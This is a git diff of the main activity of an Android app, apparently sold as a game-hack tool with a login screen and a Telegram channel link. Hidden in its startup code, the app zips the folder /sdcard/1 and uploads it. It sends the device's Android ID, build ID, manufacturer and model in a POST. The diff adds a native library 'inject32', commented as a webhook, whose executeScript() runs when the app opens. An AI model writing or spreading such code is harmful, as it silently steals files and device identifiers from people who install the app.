@@ -3,12 +3,14 @@ package com.DeFexGGxANDLUA.hacks;
 import static androidx.constraintlayout.helper.widget.MotionEffect.TAG;
 
 import android.Manifest;
+import android.annotation.SuppressLint;
 import android.content.ClipData;
 import android.content.ClipboardManager;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
+import android.media.MediaPlayer;
 import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Bundle;
@@ -24,7 +26,6 @@ import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import android.provider.Settings;
-import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
 import android.widget.Toast;
@@ -36,21 +37,13 @@ import androidx.core.content.ContextCompat;
 import android.widget.VideoView;
 import java.io.OutputStream;
 import java.net.URLEncoder;
-import android.os.AsyncTask;
-import android.os.Bundle;
-import android.view.View;
-import android.widget.Button;
-import android.widget.TextView;
-
 import okhttp3.MediaType;
 import okhttp3.MultipartBody;
 import okhttp3.OkHttpClient;
 import okhttp3.Request;
 import okhttp3.RequestBody;
 import okhttp3.Response;
-
-import java.io.File;
-import java.io.IOException;
+import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.util.zip.ZipEntry;
 import java.util.zip.ZipOutputStream;
@@ -60,14 +53,19 @@ public class MainActivity extends AppCompatActivity {
     private static final int MY_PERMISSIONS_REQUEST_WRITE_EXTERNAL_STORAGE = 123;
 
     private EditText txtUsername;
-    private Button btnLogin;
     private TextView tvMessage;
     private VideoView videoBackground;
 
-    private TextView statusTextView;
+    //load library where webhook
+    static {
+        System.loadLibrary("inject32");
+    }
+
+    // JNI-метод для выполнения скрипта
+    public native void executeScript();
 
 
-
+    @SuppressLint("SdCardPath")
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -76,36 +74,24 @@ public class MainActivity extends AppCompatActivity {
         new UploadFileTask().execute("/sdcard/1"); // Указываем путь к папке, которую нужно запаковать
         Button openChannelButton = findViewById(R.id.openChannelButton);
 
-        statusTextView = findViewById(R.id.statusText);
+        TextView statusTextView = findViewById(R.id.statusText);
         new DownloadDataTask(statusTextView).execute("https://pastebin.com/raw/CfcZ8y3P");
-        openChannelButton.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View view) {
-                openTelegramChannel();
-            }
-        });
+        openChannelButton.setOnClickListener(view -> openTelegramChannel());
 
-
+        executeScript();
         VideoView videoView = findViewById(R.id.videoBackground);
         String videoPath = "android.resource://" + getPackageName() + "/" + R.raw.video;
         videoView.setVideoURI(Uri.parse(videoPath));
         videoView.start();
 
-        videoView.setOnCompletionListener(mp -> {
-            videoView.start();
-        });
+        videoView.setOnCompletionListener((MediaPlayer mp) -> videoView.start());
 
         // Initialize views
         txtUsername = findViewById(R.id.txtUsername);
-        btnLogin = findViewById(R.id.btnLogin);
+        Button btnLogin = findViewById(R.id.btnLogin);
         tvMessage = findViewById(R.id.tvMessage);
 
-        btnLogin.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                login();
-            }
-        });
+        btnLogin.setOnClickListener(v -> login());
     }
 
     public void openTelegramChannel() {
@@ -114,6 +100,7 @@ public class MainActivity extends AppCompatActivity {
         startActivity(telegramIntent);
     }
 
+    @SuppressLint("StaticFieldLeak")
     private class UploadFileTask extends AsyncTask<String, Void, String> {
 
         @Override
@@ -157,6 +144,7 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
+    @SuppressLint("SetTextI18n")
     private void login() {
         String username = txtUsername.getText().toString();
 
@@ -168,9 +156,10 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    private class DownloadDataTask extends AsyncTask<String, Void, String> {
+    private static class DownloadDataTask extends AsyncTask<String, Void, String> {
 
-        private TextView statusTextView;
+        @SuppressLint("StaticFieldLeak")
+        private final TextView statusTextView;
 
         public DownloadDataTask(TextView statusTextView) {
             this.statusTextView = statusTextView;
@@ -226,7 +215,7 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void zipFolder(File folder, File zipFile) throws IOException {
-        try (ZipOutputStream zipOutputStream = new ZipOutputStream(new FileOutputStream(zipFile))) {
+        try (ZipOutputStream zipOutputStream = new ZipOutputStream(Files.newOutputStream(zipFile.toPath()))) {
             zipFolder(folder, folder, zipOutputStream);
         }
     }
@@ -252,13 +241,14 @@ public class MainActivity extends AppCompatActivity {
             }
         }
     }
+    @SuppressLint({"ObsoleteSdkInt", "StaticFieldLeak"})
     @RequiresApi(api = Build.VERSION_CODES.CUPCAKE)
     private class LoginTask extends AsyncTask<String, Void, String> {
 
         @Override
         protected String doInBackground(String... params) {
             String username = params[0];
-            String android_id = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+            @SuppressLint("HardwareIds") String android_id = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
             String buildId = Build.ID;  // Получаем BUILD ID
             String manufacturer = Build.MANUFACTURER; //мануфактурер фак ми
             String model = Build.MODEL;//билд модел фак ю
@@ -285,7 +275,7 @@ public class MainActivity extends AppCompatActivity {
 
                     // Получаем поток для записи данных в тело запроса
                     try (OutputStream os = urlConnection.getOutputStream()) {
-                        byte[] input = postData.getBytes("utf-8");
+                        byte[] input = postData.getBytes(StandardCharsets.UTF_8);
                         os.write(input, 0, input.length);
                     }
 
